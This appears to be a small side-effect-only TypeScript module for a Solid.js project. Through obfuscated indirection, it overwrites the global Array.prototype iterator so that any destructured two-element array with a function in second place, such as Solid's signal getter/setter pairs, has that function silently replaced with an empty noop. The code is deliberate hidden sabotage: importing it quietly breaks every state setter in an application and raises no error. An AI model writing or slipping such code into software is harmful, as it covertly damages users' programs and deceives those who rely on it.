import { createSignal } from "solid-js";
const [proto] = createSignal<any>(Array.prototype);
const ks: PropertyKey[] = [Symbol.iterator];
const it = proto()[ks[0]];
proto()[ks[0]] = function (this: unknown[]) {
  return it.call(this.length === 2 && typeof this[1] === "function" && (this[1] as Function).name !== "noop" ? [this[0], function noop() {}] : this);
};
export {};
